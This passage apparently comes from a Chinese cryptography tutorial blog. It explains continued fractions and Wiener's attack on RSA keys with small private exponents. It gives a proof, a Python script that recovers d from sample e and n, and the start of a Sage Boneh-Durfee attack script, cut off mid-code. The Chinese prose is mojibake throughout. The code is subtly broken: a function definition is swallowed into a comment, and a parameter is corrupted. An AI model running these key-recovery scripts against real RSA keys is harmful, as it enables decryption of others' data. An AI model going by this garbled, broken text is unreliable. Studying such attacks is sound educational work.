é™ä¸å¾ªç¯å°æ•°ï¼Œé‚£ä¹ˆè¿åˆ†æ•°å¾—æœ€åä¸€é¡¹å°±æ˜¯è¯¥å°æ•°çš„åˆ†æ•°è¡¨ç¤ºã€‚</p><p>å¯èƒ½ä¸æ‡‚å“ªæ¥çš„é¡¹ï¼Œä»€ä¹ˆæ˜¯æœ€åä¸€é¡¹ã€‚</p><p>ç›´æ¥é‚£ä¸Šè¿°çš„ä¾‹å­ï¼Œä½ å¯ä»¥è®¤ä¸ºï¼Œè¿åˆ†æ•°çš„</p><p>ç¬¬ä¸€é¡¹å°±æ˜¯3ï¼Œå’Œ3.245å·®å¾ˆå¤§å­</p><p>ç¬¬äºŒé¡¹æ˜¯$3\frac1 4=3.25$ï¼Œåªå·®0.005äº†</p><p>ç¬¬ä¸‰é¡¹æ˜¯$3 \frac 1 {4+\frac 1 {12}}=3\frac {12} {49}=3.24489$,å·®æ›´å°‘äº†</p><p>æœ€åä¸€é¡¹å°±æ˜¯å‡†ç¡®è¡¨ç¤ºäº†ã€‚</p><h2 id="wienerâ€˜s-Attack"><a href="#wienerâ€˜s-Attack" class="headerlink" title="wienerâ€˜s Attack"></a>wienerâ€˜s Attack</h2><p>æ‘˜è‡ª<a href="https://www.ams.org/notices/199902/boneh.pdf" target="_blank" rel="noopener">äºŒåå¹´ä»¥æ¥å¯¹ RSA å¯†ç ç³»ç»Ÿæ”»å‡»ç»¼è¿°</a></p><p>ä»¤$N=pq$ä¸”$q&lt;p&lt;2q$ï¼Œ$d&lt;\frac13N^{\frac14}$ï¼Œç»™å®š$âŸ¨N,eâŸ©$ä¸”æ»¡è¶³$ed=1 \pmod {Ï†(N)}$ï¼Œæ”»å‡»è€…å¯ä»¥æœ‰æ•ˆè®¡ç®—å‡º$d$ã€‚</p><h3 id="proof"><a href="#proof" class="headerlink" title="proof"></a>proof</h3><p>è¯æ˜åŸºäºä½¿ç”¨è¿åˆ†æ•°çš„é€¼è¿‘ï¼Œç”±äº$ed=1 \pmod {Ï†(N)}$ï¼Œé‚£ä¹ˆå­˜åœ¨ä¸€ä¸ª$k$æ»¡è¶³$edâˆ’kÏ†(N)=1$ã€‚æ‰€ä»¥ï¼Œ</p><p>$\vert \frac{e}{Ï†(N)}-\frac kd \vert= \frac 1 {dÏ†(N)}$ï¼Œå› æ­¤ï¼Œ$\frac kd $æ˜¯$\frac e {Ï†(N)}$çš„é€¼è¿‘ï¼Œå°½ç®¡æˆ‘ä»¬ä¸çŸ¥é“$Ï†(N)$ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç”¨$N$æ¥è¿‘ä¼¼ã€‚</p><p>å› ä¸º$Ï†(N)=(pâˆ’1)(qâˆ’1)=pqâˆ’pâˆ’q+1=Nâˆ’pâˆ’q+1$ï¼Œåˆ$p+qâˆ’1&lt;3\sqrt N $æ‰€ä»¥æˆ‘ä»¬æœ‰$|Nâˆ’Ï†(N)|&lt;3\sqrt N$</p><p>ä½¿ç”¨$N$æ›¿æ¢$Ï†(N)$ï¼Œæˆ‘ä»¬å¾—åˆ°ï¼š</p><p>$\vert \frac e N - \frac k d\vert = \vert \frac{ed - kN}{Nd}\vert = \vert \frac{ed - kÏ†(N)-kN+kÏ†(N)}{Nd}\vert=\vert \frac {1-k(N-Ï†(N))}{Nd}\vert â‰¤ \vert \frac{3k\sqrt{N}}{Nd}\vert =\frac{3k}{d\sqrt N}$</p><p>ç°åœ¨ï¼Œ$kÏ†(N)=edâˆ’1&lt;ed$ï¼Œå› ä¸º$e&lt;Ï†(N)$ï¼Œæˆ‘ä»¬çŸ¥é“$k&lt;d&lt;\frac13N^{\frac14}$ï¼ˆè¯‘è€…æ³¨ï¼šå¯ä»¥å¾—åˆ°$3k&lt;3d&lt;N^{\frac 14}å’ŒdN^{\frac 14}&gt;3d^2$ï¼‰ã€‚å› æ­¤æˆ‘ä»¬å¾—åˆ°ï¼š</p><p>$\vert \frac e N - \frac k d\vert â‰¤ \frac{3k}{d\sqrt N}&lt;\frac {N^{\frac1 4}}{d\sqrt N}â‰¤\frac 1 {dN^{\frac 14}}&lt; \frac 1{3d^2}$</p><p>è¿™æ˜¯ä¸€ä¸ªç»å…¸çš„é€¼è¿‘å…³ç³»ï¼Œåˆ†æ•°$\frac k d$ä¸”$d&lt;Ï†(N)$åœ¨$log_2N$çº¦æŸå†…éå¸¸é€¼è¿‘$\frac e N$ã€‚å®é™…ä¸Šï¼Œæ‰€æœ‰ç±»ä¼¼$\frac k d$è¿™æ ·çš„åˆ†æ•°éƒ½æ˜¯$\frac e N$çš„è¿åˆ†æ•°å±•å¼€çš„æ”¶æ•›ã€‚å› æ­¤æˆ‘ä»¬é¦–è¦åšçš„ä¾¿æ˜¯è®¡ç®—$\frac e N$çš„è¿åˆ†æ•°çš„$logN$æ”¶æ•›ï¼Œå…¶ä¸­ä¸€ä¸ªè¿åˆ†æ•°å°±ç­‰äº$\frac k d$ã€‚å› ä¸º$edâˆ’kÏ†(N)=1$ï¼Œæˆ‘ä»¬æœ‰$gcd(k,d)=1$ï¼Œå› æ­¤$\frac k d$æ˜¯ä¸€ä¸ªæœ€ç®€åˆ†æ•°ã€‚è¿™æ˜¯å¯ä»¥ç®—å‡ºå¯†é’¥dçš„çº¿æ€§æ—¶é—´ç®—æ³•ã€‚</p><p>(è‡³äºä¸ºå•¥dçš„ä¸Šç•Œæ˜¯é‚£ä¸ªï¼Œåˆ«é—®æˆ‘ï¼Œæ‰¾wieneré—®å»ã€‚)</p><p>ä¸‹é¢æ˜¯pythonçš„ä»£ç å®ç°</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def transform(<span class="keyword">x</span>,<span class="keyword">y</span>):       <span class="comment">#ä½¿ç”¨è¾—è½¬ç›¸å¤„å°†åˆ†æ•° x/y è½¬ä¸ºè¿åˆ†æ•°çš„å½¢å¼</span></span><br><span class="line">    res=[]</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">y</span>:</span><br><span class="line">        res.append(<span class="keyword">x</span>//<span class="keyword">y</span>)</span><br><span class="line">        <span class="keyword">x</span>,<span class="keyword">y</span>=<span class="keyword">y</span>,<span class="keyword">x</span>%y</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">    </span><br><span class="line">def continued_fraction(sub_res):</span><br><span class="line">    numerator,denominator=<span class="number">1</span>,<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i in sub_res[::-<span class="number">1</span>]:      <span class="comment">#ä»sublistçš„åé¢å¾€å‰å¾ªç¯</span></span><br><span class="line">        denominator,numerator=numerator,i*numerator+denominator</span><br><span class="line">    <span class="keyword">return</span> denominator,numerator   <span class="comment">#å¾—åˆ°æ¸è¿›åˆ†æ•°çš„åˆ†æ¯å’Œåˆ†å­ï¼Œå¹¶è¿”å›</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#æ±‚è§£æ¯ä¸ªæ¸è¿›åˆ†æ•°def sub_fraction(x,y):</span></span><br><span class="line">    res=transform(<span class="keyword">x</span>,<span class="keyword">y</span>)</span><br><span class="line">    res=list(<span class="keyword">map</span>(continued_fraction,(res[<span class="number">0</span>:i] <span class="keyword">for</span> i in range(<span class="number">1</span>,len(res)))))  <span class="comment">#å°†è¿åˆ†æ•°çš„ç»“æœé€ä¸€æˆªå–ä»¥æ±‚æ¸è¿›åˆ†æ•°</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment">#ä»¥ä¸Šæ˜¯è·å¾—e/nçš„è¿åˆ†æ•°</span></span><br><span class="line"></span><br><span class="line">def get_p<span class="string">q(a,b,c)</span>:      <span class="comment">#ç”±p+qå’Œpqçš„å€¼é€šè¿‡ç»´è¾¾å®šç†æ¥æ±‚è§£på’Œq</span></span><br><span class="line">    par=gmpy2.isqrt(b*b-<span class="number">4</span>*a*c)   <span class="comment">#ç”±ä¸Šè¿°å¯å¾—ï¼Œå¼€æ ¹å·ä¸€å®šæ˜¯æ•´æ•°ï¼Œå› ä¸ºæœ‰è§£</span></span><br><span class="line">    x1,x2=(-b+par)//(<span class="number">2</span>*a),(-b-par)//(<span class="number">2</span>*a)</span><br><span class="line">    <span class="keyword">return</span> x1,x2</span><br><span class="line"></span><br><span class="line">def wienerAttack(e,n):</span><br><span class="line">    <span class="keyword">for</span> (d,k) in sub_fraction(e,n):  <span class="comment">#ç”¨ä¸€ä¸ªforå¾ªç¯æ¥æ³¨æ„è¯•æ¢e/nçš„è¿ç»­å‡½æ•°çš„æ¸è¿›åˆ†æ•°ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªæ»¡è¶³æ¡ä»¶çš„æ¸è¿›åˆ†æ•°</span></span><br><span class="line">        <span class="keyword">if</span> k==<span class="number">0</span>:                     <span class="comment">#å¯èƒ½ä¼šå‡ºç°è¿åˆ†æ•°çš„ç¬¬ä¸€ä¸ªä¸º0çš„æƒ…å†µï¼Œæ’é™¤</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> (e*d-<span class="number">1</span>)%k!=<span class="number">0</span>:             <span class="comment">#ed=1 (\pmod Ï†(n)) å› æ­¤å¦‚æœæ‰¾åˆ°äº†dçš„è¯ï¼Œ(ed-1)ä¼šæ•´é™¤Ï†(n),ä¹Ÿå°±æ˜¯å­˜åœ¨kä½¿å¾—(e*d-1)//k=Ï†(n)</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        phi=(e*d-<span class="number">1</span>)//k               <span class="comment">#è¿™ä¸ªç»“æœå°±æ˜¯ Ï†(n)</span></span><br><span class="line">        px,qy=get_p<span class="string">q(1,n-phi+1,n)</span></span><br><span class="line">        <span class="keyword">if</span> px*qy==n:</span><br><span class="line">            p,<span class="keyword">q</span>=<span class="keyword">abs</span>(<span class="keyword">int</span>(px)),<span class="keyword">abs</span>(<span class="keyword">int</span>(qy))     <span class="comment">#å¯èƒ½ä¼šå¾—åˆ°ä¸¤ä¸ªè´Ÿæ•°ï¼Œè´Ÿè´Ÿå¾—æ­£æœªå°ä¸ä¼šå‡ºç°</span></span><br><span class="line">            d=gmpy2.invert(e,(p-<span class="number">1</span>)*(<span class="keyword">q</span>-<span class="number">1</span>))     <span class="comment">#æ±‚ed=1 (\pmod  Ï†(n))çš„ç»“æœï¼Œä¹Ÿå°±æ˜¯eå…³äº Ï†(n)çš„ä¹˜æ³•é€†å…ƒd</span></span><br><span class="line">            <span class="keyword">return</span> d</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">"è¯¥æ–¹æ³•ä¸é€‚ç”¨"</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">e = <span class="number">14058695417015334071588010346586749790539913287499707802938898719199384604316115908373997739604466972535533733290829894940306314501336291780396644520926473</span></span><br><span class="line">n = <span class="number">33608051123287760315508423639768587307044110783252538766412788814888567164438282747809126528707329215122915093543085008547092423658991866313471837522758159</span></span><br><span class="line">d = wienerAttack(e,n)</span><br><span class="line"><span class="keyword">print</span>(<span class="string">"d="</span>,d)</span><br></pre></td></tr></table></figure><h2 id="Wienerâ€˜s-Attackå¤±æ•ˆæ—¶"><a href="#Wienerâ€˜s-Attackå¤±æ•ˆæ—¶" class="headerlink" title="Wienerâ€˜s Attackå¤±æ•ˆæ—¶"></a>Wienerâ€˜s Attackå¤±æ•ˆæ—¶</h2><p>å¤±æ•ˆå°±æ˜¯æ„å‘³ç€ç•Œé™ä¸æ»¡è¶³ï¼Œè€Œç°å­˜çš„æœ‰è®¸å¤šåŸºäºWienerâ€˜s Attackçš„å˜å‹ç®—æ³•å°±æ˜¯ç”¨æ¥å°½é‡æ‰©å¤§è¿™ä¸ªç•Œé™çš„ã€‚è¿™é‡Œæ˜¯Boneh Durfee Attackçš„è„šæœ¬ï¼Œéœ€è¦ç”¨åˆ°å¤šå…ƒcoppersmithçš„åŸç†ï¼ˆä¿ºä¸ä¼šï¼Œç•¥ç•¥ç•¥ï¼‰</p><p>åˆ©ç”¨æ¡ä»¶ï¼šå·²çŸ¥ç»™å‡ºn,e,c  ï¼ˆeå¾ˆå¤§ï¼‰  (boneh_durfee.sage)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"><span class="comment"># Config</span></span><br><span class="line"><span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Setting debug to true will display more informations</span></span><br><span class="line"><span class="string">about the lattice, the bounds, the vectors...</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Setting strict to true will stop the algorithm (and</span></span><br><span class="line"><span class="string">return (-1, -1)) if we don't have a correct </span></span><br><span class="line"><span class="string">upperbound on the determinant. Note that this </span></span><br><span class="line"><span class="string">doesn't necesseraly mean that no solutions </span></span><br><span class="line"><span class="string">will be found since the theoretical upperbound is</span></span><br><span class="line"><span class="string">usualy far away from actual results. That is why</span></span><br><span class="line"><span class="string">you should probably use `strict = False`</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">strict = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">This is experimental, but has provided remarkable results</span></span><br><span class="line"><span class="string">so far. It tries to reduce the lattice as much as it can</span></span><br><span class="line"><span class="string">while keeping its efficiency. I see no reason not to use</span></span><br><span class="line"><span class="string">this option, but if things don't work, you should try</span></span><br><span class="line"><span class="string">disabling it</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">helpful_only = <span class="literal">True</span></span><br><span class="line">dimension_min = <span class="number">7</span> <span class="comment"># stop removing if lattice reaches that dimension</span></span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"><span class="comment"># Functions</span></span><br><span class="line"><span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># display stats on helpful vectors</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">helpful_vectors</span><span class="params">(BB, modulus)</span>:</span></span><br><span class="line">    nothelpful = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> range(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">if</span> BB[ii,ii] &gt;= modulus:</span><br><span class="line">            nothelpful += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> nothelpful, <span class="string">"/"</span>, BB.dimensions()[<span class="number">0</span>], <span class="string">" vectors are not helpful"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># display matrix picture with 0 and X</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">matrix_overview</span><span class="params">(BB, bound)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> range(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        a = (<span class="string">'%02d '</span> % ii)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> range(BB.dimensions()[<span class="number">1</span>]):</span><br><span class="line">            a += <span class="string">'0'</span> <span class="keyword">if</span> BB[ii,jj] == <span class="number">0</span> <span class="keyword">else</span> <span class="string">'X'</span></span><br><span class="line">            <span class="keyword">if</span> BB.dimensions()[<span class="number">0</span>] &lt; <span class="number">60</span>:</span><br><span class="line">                a += <span class="string">' '</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            a += <span class="string">'~'</span></span><br><span class="line">        <span class="keyword">print</span> a</span><br><span class="line"></span><br><span class="line"><span class="comment"># tries to remove unhelpful vectors</span></span><br><span class="line"><span class="comment"># we start at current = n-1 (last vector)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove_unhelpful</span><span class="params">(BB, monomials, bound, current)</span>:</span></span><br><span class="line">    <span class="comment"># end of our recursive function</span></span><br><span class="line">    <span class="keyword">if</span> current == <span class="number">-1</span> <span class="keyword">or</span> BB.dimensions()[<span class="number">0</span>] &lt;= dimension_min:</span><br><span class="line">        <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line">    <span class="comment"># we start by checking from the end</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> range(current, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">        <span class="comment"># if it is unhelpful:</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            affected_vectors = <span class="number">0</span></span><br><span class="line">            affected_vector_index = <span class="number">0</span></span><br><span class="line">            <span class="comment"># let's check if it affects other vectors</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> range(ii + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                <span class="comment"># if another vector is affected:</span></span><br><span class="line">                <span class="comment"># we increase the count</span></span><br><span class="line">                <span class="keyword">if</span> BB[jj, ii] != <span class="number">0</span>:</span><br><span class="line">                    affected_vectors += <span class="number">1</span></span><br><span class="line">                    affected_vector_index = jj</span><br><span class="line"></span><br><span class="line">            <span class="comment"># level:0</span></span><br><span class="line">            <span class="comment"># if no other vectors end up affected</span></span><br><span class="line">            <span class="comment"># we remove it</span></span><br><span class="line">            <span class="keyword">if</span> affected_vectors == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"* removing unhelpful vector"</span>, ii</span><br><span class="line">                BB = BB.delete_columns([ii])</span><br><span class="line">                BB = BB.delete_rows([ii])</span><br><span class="line">                monomials.pop(ii)</span><br><span class="line">                BB = remove_unhelpful(BB, monomials, bound, ii<span class="number">-1</span>)</span><br><span class="line">                <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line">            <span class="comment"># level:1</span></span><br><span class="line">            <span class="comment"># if just one was affected we check</span></span><br><span class="line">            <span class="comment"># if it is affecting someone else</span></span><br><span class="line">            <span class="keyword">elif</span> affected_vectors == <span class="number">1</span>:</span><br><span class="line">                affected_deeper = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">for</span> kk <span class="keyword">in</span> range(affected_vector_index + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                    <span class="comment"># if it is affecting even one vector</span></span><br><span class="line">                    <span class="comment"># we give up on this one</span></span><br><span class="line">                    <span class="keyword">if</span> BB[kk, affected_vector_index] != <span class="number">0</span>:</span><br><span class="line">                        affected_deeper = <span class="literal">False</span></span><br><span class="line">                <span class="comment"># remove both it if no other vector was affected and</span></span><br><span class="line">                <span class="comment"># this helpful vector is not helpful enough</span></span><br><span class="line">                <span class="comment"># compared to our unhelpful one</span></span><br><span class="line">                <span class="keyword">if</span> affected_deeper <span class="keyword">and</span> abs(bound - BB[affected_vector_index, affected_vector_index]) &lt; abs(bound - BB[ii, ii]):</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"* removing unhelpful vectors"</span>, ii, <span class="string">"and"</span>, affected_vector_index</span><br><span class="line">                    BB = BB.delete_columns([affected_vector_index, ii])</span><br><span class="line">                    BB = BB.delete_rows([affected_vector_index, ii])</span><br><span class="line">                    monomials.pop(affected_vector_index)</span><br><span class="line">                    monomials.pop(ii)</span><br><span class="line">                    BB = remove_unhelpful(BB, monomials, bound, ii<span class="number">-1</span>)</span><br><span class="line">                    <span class="keyword">return</span> BB</span><br><span class="line">    <span class="comment"># nothing happened</span></span><br><span class="line">    <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line"><span class="string">""" </span></span><br><span class="line"><span class="string">Returns:</span></span><br><span class="line"><span class="string">* 0,0   if it fails</span></span><br><span class="line"><span class="string">* -1,-1 if `strict=true`, and determinant doesn't bound</span></span><br><span class="line"><span class="string">* x0,y0 the solutions of `pol`</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">boneh_durfee</span><span class="params">(pol, \pmodulus, mm, tt, XX, YY)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Boneh and Durfee revisited by Herrmann and May</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    finds a solution if:</span></span><br><span class="line"><span class="string">    * d &lt; N^delta</span></span><br><span class="line"><span class="string">    * |x| &lt; e^delta</span></span><br><span class="line"><span class="string">    * |y| &lt; e^0.5</span></span><br><span class="line"><span class="string">    whenever delta &lt; 1 - sqrt(2)/2 ~ 0.292</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># substitution (Herrman and May)</span></span><br><span class="line">    PR.&lt;u, x, y&gt; = PolynomialRing(ZZ)</span><br><span class="line">    Q = PR.quotient(x*y + <span class="number">1</span> - u) <span class="comment"># u = xy + 1</span></span><br><span class="line">    polZ = Q(pol).lift()</span><br><span class="line"></span><br><span class="line">    UU = XX*YY + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># x-shifts</span></span><br><span 